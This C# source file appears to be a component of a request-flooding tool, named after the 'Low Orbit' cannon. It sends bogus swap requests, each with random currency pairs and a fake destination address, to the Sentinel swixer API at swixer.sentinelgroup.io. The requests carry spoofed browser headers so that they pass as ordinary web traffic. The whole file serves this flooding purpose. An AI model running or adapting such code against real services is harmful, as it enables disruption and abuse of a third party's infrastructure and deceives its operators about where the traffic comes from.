using System;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using AsmodatStandard.Extensions;

namespace AsmodatLowOrbitRequestCannon
{
    public class Payload
    {
        public enum Currencies
        {
            BNB = 0,
            SENT = 1,
            ETH = 2,
            PIVX = 3
        }

        public Payload(string address, Currencies from, Currencies to, long delay = 60)
        {
            destination_address = address;
            from_symbol = from.ToString();
            to_symbol = to.ToString();
            delay_in_seconds = delay;
        }

        public string destination_address;
        public string from_symbol;
        public string to_symbol;
        public long delay_in_seconds;
        public string client_address = "0x47bd80a152d0d77664d65de5789df575c9cabbdb";
        public string node_address = "0x47bd80a152d0d77664d65de5789df575c9cabbdb";
    }

    public class Swix
    {
        public bool success;
        public string address;
        public string swix_hash;
    }

    public class SwixRsponse
    {
        public bool success;
        public int? status;
        public object[] tx_infos;
        public object remaining_amount;
    }

    public static class SwixConnect
    {
        private static string _requestUrl1 = "https://api.swixer.sentinelgroup.io/swix";
        private static string _requestUrl2 = "https://api.swixer.sentinelgroup.io/swix/status?hash=";

        private readonly static (string, string)[] _headers = new(string, string)[] {
            ("Accept-Encoding", "gzip, deflate, br"),
                ("Accept-Language", "en-US,en;q=0.9,cs-CZ;q=0.8,cs;q=0.7,pl-PL;q=0.6,pl;q=0.5"),
                ("Accept-Encoding", "gzip, deflate, br"),
                ("Connection", "keep-alive"),
                ("DNT", "1"),
                ("Host", "api.swixer.sentinelgroup.io"),
                ("Origin", "https://swixer.sentinelgroup.io"),
                ("Referer", "https://swixer.sentinelgroup.io/"),
                ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36")
        };

        public static async Task<bool> Swix(bool verify)
        {
            using (var client = new HttpClient() { Timeout = TimeSpan.FromMinutes(60) })
            {
                var from = (Payload.Currencies)RandomEx.Next(0, 4);
                var to = (Payload.Currencies)RandomEx.Next(0, 4);
                string address = null;

                if ((to == Payload.Currencies.PIVX))
                    address = $"D{RandomEx.NextAlphanumeric(33).ReplaceMany(("I", "L"), ("i", "l"), ("0", "1"), ("O", "P"))}";
                else
                    address = $"0x{RandomEx.NextHexString(40)}";

                var delay = 60;
                var json = new Payload(address, from, to, delay).JsonSerialize();

                var content = new StringContent(json, encoding: Encoding.UTF8);
                var response = await client.POST(_requestUrl1, content, System.Net.HttpStatusCode.OK, false, _headers);

                if (!response.JsonDeserialize<Swix>().swix_hash.IsNullOrWhitespace())
                {
                    if (!verify)
                        return true;

                    var check = await client.GET($"{_requestUrl2}{response.JsonDeserialize<Swix>().swix_hash}", System.Net.HttpStatusCode.OK);
                    return check.JsonDeserialize<SwixRsponse>().success;
                }
                else
                    throw new Exception($"Server failed with message: {response}, after receiving payload: {json}");
            }
        }
    }
}
